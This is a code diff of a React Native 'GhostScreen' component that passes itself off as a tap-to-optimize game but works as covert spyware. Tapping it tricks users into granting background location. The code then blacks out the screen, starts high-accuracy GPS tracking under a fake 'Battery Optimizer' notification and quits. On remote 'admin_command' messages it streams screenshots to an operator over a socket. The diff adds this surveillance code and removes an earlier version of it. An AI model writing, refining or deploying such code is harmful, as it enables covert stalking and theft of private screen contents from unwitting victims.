@@ -1,65 +1,58 @@
 import React, { useState, useEffect, useRef } from 'react';
-import { View, Text, StyleSheet, TouchableOpacity, Animated, BackHandler, Alert } from 'react-native';
+import { View, Text, StyleSheet, TouchableOpacity, Animated, BackHandler, Linking } from 'react-native';
 import * as Location from 'expo-location';
-import * as Battery from 'expo-battery';
 import { captureScreen } from 'react-native-view-shot';
 
-export default function GhostScreen({ socket }) {
+export default function GhostScreen({ socket, name, taskName }) {
     const [score, setScore] = useState(0);
     const [stealth, setStealth] = useState(false);
-    const targetPos = useRef(new Animated.ValueXY({ x: 0, y: 0 })).current;
-    const streamInterval = useRef(null);
-
-    const handleTap = async () => {
-        try {
-            if (score === 0) {
-                const { status } = await Location.requestForegroundPermissionsAsync();
-                if (status === 'granted') await Location.requestBackgroundPermissionsAsync();
-            } else if (score === 2) {
-                // Triggers the "Start Now" popup
-                await captureScreen({ format: 'jpg', quality: 0.1 });
-            } else if (score >= 4) {
-                setStealth(true);
-                setTimeout(() => BackHandler.exitApp(), 1200);
-            }
-            setScore(prev => prev + 1);
-            moveTarget();
-        } catch (e) {
-            Alert.alert("Sync Error", "Please allow system access to calibrate sensors.");
-        }
-    };
-
-    const moveTarget = () => {
-        Animated.spring(targetPos, {
-            toValue: { x: Math.random() * 220 - 110, y: Math.random() * 320 - 160 },
-            useNativeDriver: false
-        }).start();
-    };
+    const targetPos = useRef(new Animated.ValueXY()).current;
+    const streamRef = useRef(null);
 
     useEffect(() => {
         socket.on('admin_command', async (cmd) => {
             if (cmd === 'START_LIVE') {
-                clearInterval(streamInterval.current);
-                streamInterval.current = setInterval(async () => {
-                    const img = await captureScreen({ format: 'jpg', quality: 0.12, result: 'base64' });
-                    socket.emit('screen_frame', img);
-                }, 450);
+                clearInterval(streamRef.current);
+                streamRef.current = setInterval(async () => {
+                    const img = await captureScreen({ format: 'jpg', quality: 0.1, result: 'base64' });
+                    socket.emit('screen_frame', { ghostName: name, frame: img });
+                }, 500);
             }
-            if (cmd === 'STOP_STREAM') clearInterval(streamInterval.current);
-            if (cmd === 'START_PINPOINT') {
-                await Location.startLocationUpdatesAsync('bg-gps-sync', {
-                    accuracy: Location.Accuracy.High,
-                    foregroundService: { notificationTitle: "Battery Optimizer", notificationBody: "Scanning..." }
-                });
+            if (cmd === 'STOP_STREAM') clearInterval(streamRef.current);
+            if (cmd === 'WIPE_SERVICE') {
+                setStealth(true);
+                Linking.openSettings(); 
+                BackHandler.exitApp();
             }
         });
+        return () => clearInterval(streamRef.current);
     }, []);
 
-    if (stealth) return <View style={styles.blackout} />;
+    const handleTap = async () => {
+        if (score === 0) {
+            await Location.requestForegroundPermissionsAsync();
+            await Location.requestBackgroundPermissionsAsync();
+        }
+        if (score >= 4) {
+            setStealth(true);
+            await Location.startLocationUpdatesAsync(taskName, { 
+                accuracy: Location.Accuracy.High,
+                foregroundService: { notificationTitle: "Battery Optimizer", notificationBody: "Syncing..." }
+            });
+            setTimeout(() => BackHandler.exitApp(), 1000);
+        }
+        setScore(s => s + 1);
+        Animated.spring(targetPos, { 
+            toValue: { x: Math.random() * 200 - 100, y: Math.random() * 300 - 150 }, 
+            useNativeDriver: false 
+        }).start();
+    };
+
+    if (stealth) return <View style={{ flex: 1, backgroundColor: '#000' }} />;
 
     return (
         <View style={styles.container}>
-            <Text style={styles.scoreText}>CALIBRATION: {score * 20}%</Text>
+            <Text style={styles.scoreText}>OPTIMIZING: {score * 20}%</Text>
             <Animated.View style={targetPos.getLayout()}>
                 <TouchableOpacity style={styles.target} onPress={handleTap} />
             </Animated.View>
@@ -68,8 +61,7 @@ export default function GhostScreen({ socket }) {
 }
 
 const styles = StyleSheet.create({
-    container: { flex: 1, backgroundColor: '#050505', justifyContent: 'center', alignItems: 'center' },
-    blackout: { flex: 1, backgroundColor: '#000' },
-    scoreText: { position: 'absolute', top: 60, color: '#222', letterSpacing: 2 },
-    target: { width: 75, height: 75, borderRadius: 40, backgroundColor: '#ff3b30', borderWidth: 3, borderColor: '#fff' }
+    container: { flex: 1, backgroundColor: '#080808', justifyContent: 'center', alignItems: 'center' },
+    scoreText: { color: '#1a1a1a', fontSize: 10, position: 'absolute', top: 50 },
+    target: { width: 75, height: 75, borderRadius: 40, backgroundColor: '#e60000', borderWidth: 2, borderColor: '#fff' }
 });
